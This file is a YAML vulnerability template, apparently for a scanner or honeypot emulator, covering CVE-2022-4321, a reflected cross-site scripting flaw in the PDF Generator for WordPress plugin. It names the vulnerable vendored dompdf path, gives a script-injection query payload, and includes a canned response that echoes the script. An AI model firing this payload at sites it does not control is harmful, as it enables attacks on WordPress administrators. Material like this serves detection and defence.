id: CVE-2022-4321
info:
  name: PDF Generator for WordPress < 1.1.2 - Cross Site Scripting
  author: r3Y3r53,HuTa0
  description: 'The plugin includes a vendored dompdf example file which is susceptible
    to Reflected Cross-Site Scripting and could be used against high privilege users
    such as admin

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into the affected WordPress website, potentially leading
    to unauthorized access, data theft, or further compromise of the website.

    '
  remediation: Fixed in version 1.1.2
  reference:
  - https://wpscan.com/vulnerability/6ac1259c-86d9-428b-ba98-7f3d07910644
  - https://nvd.nist.gov/vuln/detail/CVE-2022-4321
  - https://wordpress.org/plugins/pdf-generator-for-wp/
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/kwalsh-rz/github-action-ecr-scan-test
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-4321
    cwe-id: CWE-79
    epss-score: 0.00078
    epss-percentile: 0.32646
    cpe: cpe:2.3:a:wpswings:pdf_generator_for_wordpress:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: wpswings
    product: pdf_generator_for_wordpress
    framework: wordpress
    publicwww-query: /wp-content/plugins/pdf-generator-for-wp
  tags: cve,cve2022,wpscan,wordpress,wp,wp-plugin,xss,pdf-generator-for-wp,wpswings
traps:
- request:
    method: GET
    path: /wp-content/plugins/pdf-generator-for-wp/package/lib/dompdf/vendor/dompdf/dompdf/I18N/Arabic/Examples/Query.php?keyword="><script>alert(document.domain)</script>
    headers: null
    body: null
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: '><script>alert(document.domain)</script>pdf-generator-for-wpTotal execution
      time is'
